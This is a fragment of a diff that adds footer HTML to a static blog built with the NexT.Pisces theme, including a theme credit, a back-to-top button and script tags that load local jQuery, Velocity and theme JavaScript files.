+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
+<script src="/js/schemes/pisces.js?v=7.3.0"></script>
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
 </body>
 </html>
